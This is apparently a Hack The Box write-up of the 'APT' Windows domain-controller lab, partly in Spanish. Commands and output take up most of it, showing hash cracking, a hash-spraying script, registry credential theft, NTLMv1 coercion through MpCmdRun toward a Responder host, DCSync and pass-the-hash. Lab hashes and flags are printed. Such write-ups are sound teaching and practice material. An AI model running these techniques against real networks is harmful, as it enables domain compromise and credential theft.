---
title: APT - Insane (HTB)
tags:
permalink: /APT-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p80,135 10.129.96.60              
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 22:55 -0500
Nmap scan report for 10.129.96.60
Host is up (0.39s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
```

## Website 

La pagina principal es estatica sin nada de nada.

![[Pasted image 20260101005756.png]]

## RPC


```bash
root㉿kali)-[/home/zs1n/Desktop/htb/apt]
└─# git clone https://github.com/mubix/IOXIDResolver   
Cloning into 'IOXIDResolver'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (30/30), done.
remote: Total 33 (delta 12), reused 5 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (33/33), 9.04 KiB | 9.04 MiB/s, done.
Resolving deltas: 100% (12/12), done.
```
## Nmap IPv6

```bash
python3 IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::95ef:d379:b3a:863a
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::1a5
```

```bash

```

```bash
nxc smb apt.htb -u '' -p ''
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [*] Windows 10 / Server 2016 Build 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [+] htb.local\:
```

```bash
impacket-smbclient 'htb.local/@apt.htb' -no-pass -dc-ip dead:beef::95ef:d379:b3a:863a 
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
backup
IPC$
NETLOGON
SYSVOL
# use backup
ls
# ls
drw-rw-rw-          0  Thu Sep 24 03:31:03 2020 .
drw-rw-rw-          0  Thu Sep 24 03:31:03 2020 ..
-rw-rw-rw-   10650961  Thu Sep 24 03:31:03 2020 backup.zip
# get backup.zip

```

```bash
7z x backup.zip  

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10650961 bytes (11 MiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 10650961

    
Enter password (will not be echoed):

```

```bash
zip2john backup.zip > hash_zip
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                               
┌──(root㉿kali)-[/home/zs1n]
└─# john hash_zip -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2025-12-31 23:03) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -security registry/SYSTEM LOCAL
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::
jeb.sloan:3200:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30:::
<SNIP>
```

```bash
cat hashes_users | grep ':::' | tr ':' ' ' | awk '{print $4}' > hashes
```

```bash
cat hashes_users | grep ':::' | tr ':' ' ' | awk '{print $1}' > userss
```

```bash
 kerbrute userenum --dc apt.htb -d htb.local userss 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/31/25 - Ronnie Flathers @ropnop

2025/12/31 23:07:24 >  Using KDC(s):
2025/12/31 23:07:24 >   apt.htb:88

2025/12/31 23:07:30 >  [+] VALID USERNAME:       Administrator@htb.local
2025/12/31 23:07:31 >  [+] VALID USERNAME:       APT$@htb.local
2025/12/31 23:12:18 >  [+] VALID USERNAME:       henry.vinson@htb.local
2025/12/31 23:29:46 >  Done! Tested 2000 usernames (3 valid) in 1342.149 seconds
```

https://github.com/3gstudent/pyKerbrute/blob/master/ADPwdSpray.py

```python
<SNIP>
user_realm = 'htb.local'
    user_name = 'henry.vinson'
    kdc_a = 'apt.htb'

    file= open("hashes", "r")

    info = log.progress("Iniciando Hash Spraying")
    info.status("Attacking...")
    counter = 1

    for hash in file.readlines():
        hash = hash.strip()

        progress = log.progress("Testing with hash %s: %d/2000" % (hash, counter) )

        user_key = (RC4_HMAC, hash.decode('hex'))
        passwordspray_tcp(user_realm, user_name, user_key, kdc_a, hash)
        
        counter += 1
```

```bash
python2.7 pwd.py
[/.......] Iniciando Hash Spraying: Attacking...
[|] Testing with hash 7c662956a4a0486a80fbb2403c5a9c2c: 567/2000
[+] Valid login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
```

```bash
impacket-getTGT htb.local/henry.vinson  -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip apt.htb
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in henry.vinson.ccache
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/apt]
└─# export KRB5CCNAME=henry.vinson.ccache
```

```bash
oxdf@parrot$ reg.py -dc-ip htb.local htb.local/henry.vinson@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU\\SOFTWARE
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE
HKU\SOFTWARE\GiganticHostingManagementSystem
HKU\SOFTWARE\Microsoft
HKU\SOFTWARE\Policies
HKU\SOFTWARE\RegisteredApplications
HKU\SOFTWARE\VMware, Inc.
HKU\SOFTWARE\Wow6432Node
HKU\SOFTWARE\Classes

oxdf@parrot$ reg.py -dc-ip htb.local htb.local/henry.vinson@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb  query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE\GiganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```

```powershell
evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> type ../desktop/user.txt
d7ae89574dc4b6422f9ad5760845fbeb
```

La ruta para la escalada de privilegios es que se encuentra el bloque de scripts que se ejecuta como administrador en el archivo de historial powershell que habilita el nivel 2 de lmcompatibilitylevel, lo que significa que DC acepta la autenticación NT, NTLMv1 y NTLMv2 de acuerdo con la documentación de Microsoft:

![[Pasted image 20260101013704.png]]

```bash
 cat /etc/responder/Responder.conf
[Responder Core]

; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

; Servers to start
SQL      = On
SMB      = On
QUIC     = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = On
HTTPS    = On
DNS      = On
LDAP     = On
DCERPC   = On
WINRM    = On
SNMP     = On
MQTT     = On

; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
;Challenge = Random
Challenge = 1122334455667788

```

```powershell
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.17.19\test
```

```bash
responder -I tun0 --lm
<SNIP>
[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```

```bash
python3 ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
Hashfield Split:
['APT$', '', 'HTB', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '1122334455667788']

Hostname: HTB
Username: APT$
Challenge: 1122334455667788
LM Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
NT Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
CT1: 95ACA8C7248774CB
CT2: 427E1AE5B8D5CE68
CT3: 30A49B5BB858D384

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin 30A49B5BB858D384 1122334455667788

To crack with hashcat create a file with the following contents:
95ACA8C7248774CB:1122334455667788
427E1AE5B8D5CE68:1122334455667788

echo "95ACA8C7248774CB:1122334455667788">>14000.hash
echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1

Once complete run output through deskey_to_ntlm.pl
```

https://ntlmv1.com/

![[Pasted image 20260101015140.png]]

![[Pasted image 20260101015217.png]]

![[Pasted image 20260101015159.png]]

```bash
nxc smb apt.htb -u ntlmv1-multi/valid_users -H 'd167c3238864b12f5f82feae86a7f798'
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [*] Windows 10 / Server 2016 Build 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         dead:beef::95ef:d379:b3a:863a 445    APT              [+] htb.local\apt$:d167c3238864b12f5f82feae86a7f798 
```

```bash
impacket-getTGT 'htb.local/apt$'  -hashes :d167c3238864b12f5f82feae86a7f798 -dc-ip apt.htb                               
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in apt$.ccache
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/apt]
└─# export KRB5CCNAME=apt\$.ccache  
```

```bash
 impacket-secretsdump 'apt.htb/apt$@apt.htb' -hashes :d167c3238864b12f5f82feae86a7f798 -dc-ip apt.htb
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up... 
```

```powershell
evil-winrm -i htb.local -u administrator -H 'c370bddf384a691d811ff3495e8a72e2'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
9c5bce59c479e556e4f293b9acd6bcbe
```

`~Happy Hacking.`